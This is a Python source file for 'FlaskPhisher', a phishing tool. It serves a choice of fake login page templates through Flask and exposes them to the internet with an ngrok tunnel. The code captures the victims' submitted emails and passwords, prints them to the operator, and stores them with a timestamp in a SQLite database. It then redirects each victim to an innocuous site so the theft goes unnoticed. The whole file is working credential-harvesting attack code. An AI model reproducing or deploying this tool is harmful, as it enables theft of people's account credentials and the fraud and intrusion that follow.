# Python Libraries
from flask import Flask, render_template, request, url_for
from werkzeug.utils import redirect
from colorama import Fore
from pyngrok import ngrok
import logging
import sys
import datetime
import sqlite3
# Python Libraries End

# FlaskPhisher Modules
from Modules.phishing_template_list import templateList
from Modules.templatePathChooser import templatePathChooser
from Modules.banner import banner, notice, banner1
from Modules.screenCleaner import screenCleaner
# FlaskPhisher Modules End

# Colors
red = Fore.RED
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
cyan = Fore.CYAN
reset = Fore.RESET
# Colors End

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__,template_folder='./templates')


class FlaskPhisher():
    @app.route("/", methods=['POST', 'GET'])
    def phisher_home():
        try:
            if request.method == 'POST':
                username = request.form['email']
                password = request.form['password']
                if username and password:
                    phishedCredentials(username=username, password=password)
                    return redirect(url_for("phisher_login_success"))
            return render_template(path)
        except Exception as err:
            return render_template(path, error=str(err))

    @app.route("/success")
    def phisher_login_success():
        return redirect(redirect_addr, code=301)

def phishedCredentials(username,password):
    print("\n================================================================\n" + cyan + "[+] Username or Email: " + red + str(username) + cyan + "\n[+] Password: " + red + str(password) + reset + "\n================================================================")
    saveData(username=username,password=password)

def saveData(username,password):
    db = "./db/FlaskPhisher.db"
    connection = sqlite3.connect(db)
    cursor = connection.cursor()
    # Database Configs End
    date = datetime.datetime.now().strftime("%Y-%b-%d")
    time = datetime.datetime.now().strftime("%H:%M:%S:%p")
    sqlQuery = "INSERT INTO flaskphisher(usernam_or_email,password, cred_date, cred_time) VALUES(?,?,?,?)"
    queryParameters = (username, password, date, time)
    cursor.execute(sqlQuery, queryParameters)
    cursor.fetchall()
    connection.commit()
    connection.close()

if __name__ == "__main__":
    screenCleaner()
    print(banner)
    print(red + notice + reset)
    print(green + " Phishing Templates List" + reset)
    print(blue + str(templateList) + reset)
    try:
        template = input(yellow + "[#] Template Number: " + reset)
    except Exception as err:
        print(red + "[-] Error: " + reset + str(err))
    except KeyboardInterrupt:
        print(red + "Keyboard Interrupted!" + reset)
        sys.exit()

    templateNumbers = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16']

    if template in templateNumbers:
        try:
            port = int(input( yellow + "[#] Port: "  + reset))
            redirect_addr = str(input(green + "[!] Default Redirect URL is " + reset + red + "'https://google.com'\n" + reset + yellow + "[#] Please enter what site do you want to redirect: "  + reset))
            if redirect_addr == '':
                redirect_addr = "https://google.com"
            elif redirect_addr == " ":
                redirect_addr = "https://google.com"
            path = templatePathChooser(number=template)
            ngrok_url = ngrok.connect(port)
            try:
                screenCleaner()
                print(blue + banner1 + reset + "\n")
                print(green + "[!] " + str(ngrok_url) + reset + "\n")
                app.run(port=port)
            except Exception as err:
                print(err)
            except KeyboardInterrupt:
                print(red + "Keyboard Interrupted!" + reset)
        except Exception as err:
            print(red + "[-] Error: " + reset + str(err))
        except KeyboardInterrupt:
            print(red + "Keyboard Interrupted!" + reset)
            sys.exit()
    else:
        print(red + "[-] You are not choose template or You choose wrong template number!" + reset)
        sys.exit()